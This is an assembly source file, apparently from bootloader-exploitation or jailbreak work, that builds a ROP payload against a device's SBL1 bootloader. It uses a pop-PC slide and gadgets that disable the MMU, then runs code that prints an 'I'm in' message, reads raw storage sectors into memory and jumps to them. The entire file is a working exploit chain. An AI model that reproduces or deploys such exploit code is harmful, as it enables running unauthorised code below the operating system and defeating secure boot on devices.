.nds

.create "payload.bin",0x0

.include "sbl_gadgets.s"
.headersize 0x8056E14


.org 0x8056E14

    ; In the event that we're off by a factor of 4 or so,
    ; hopefully we'll slide into the ROP fine
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC

    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC
    .word SBL1_THUMB_POP_PC

rop:
    .word SBL1_THUMB_POP_PC ; r6
    .word SBL1_THUMB_POP_PC ; r7
    .word SBL1_THUMB_POP_PC ; r8
    .word SBL1_THUMB_POP_PC ; r9
    .word SBL1_THUMB_POP_PC ; r10
    .word SBL1_THUMB_POP_PC ; r11
    .word SBL1_THUMB_POP_R4R5R6R7R8R9R10R11R12_PC ; lr 
    .word 0xF00FF00F ; r4
    .word 0xF00FF00F ; r5
    .word 0xF00FF00F ; r6
    .word 0xF00FF00F ; r7
    .word SBL1_ARM_MMU_DISABLE ; r8 - we jump to this with lr set to the payload
    .word 0xF00FF00F ; r9
    .word 0xF00FF00F ; r10
    .word 0xF00FF00F ; r11
    .word SBL1_THUMB_BX_R8 ; r12 - this will get run in THUMB
    .word SBL1_THUMB_POP_R4R5R6_LR__ORR_R12_1__BX_R12 ; pc
    .word 0xF00FF00F ; r4
    .word 0xF00FF00F ; r5
    .word 0xF00FF00F ; r6
    .word payload_final ; lr - This will get set, but not run (yet)
    
    ; END OF ROP!!
    .word 0xDEADB00F
    .word 0xDEADB00F
    .word 0xDEADB00F
    .word 0xDEADB00F
    .word 0xDEADB00F
    .word 0xDEADB00F
    .word 0xDEADB00F
    .word 0xDEADB00F

.arm
.align 0x10
payload_final:
    ldr r0, =0x408040
    ldr r1, =0xFFFFFF
    ldr r2, =SBL1_THUMB_FBFILL
    blx r2
    
    ldr r0, =SBL1_THUMB_FBUPDATE
    blx r0
    
    ldr r0, =main_stack_end
    ldr r1, =0x1000
    ldr r2, =SBL1_THUMB_CONINIT
    blx r2
    
    ldr r0, =hacker_voice
    ldr r1, =SBL1_THUMB_BOOT_LOG_MSG
    blx r1
    
    mov r0, #0x1
    ldr r1, =SBL1_THUMB_FBUPDATE2
    blx r1
    
    ldr r4, =0xC0000
    ldr r6, =prog_dst
    mov r5, #0xE
.loop:
    mov r0, r6
    mov r1, r4
    ldr r2, =0x1000
    ldr r3, =SBL1_THUMB_RAWREAD
    blx r3

    add r4, r4, #0x1000
    add r6, r6, #0x1000
    sub r5, r5, #0x1
    cmp r5, #0x0
    bne .loop

    ldr r0, =prog_dst
    bx r0

.pool

hacker_voice:
    .byte 0x0A
    .byte 0x0A
    .byte 0x0A
    .ascii ">   *hacker voice*  I'm in..."
    .byte 0x0A
    .byte 0

.org 0x08057000
main_stack_end:

.org 0xD0000000
prog_dst:
.close


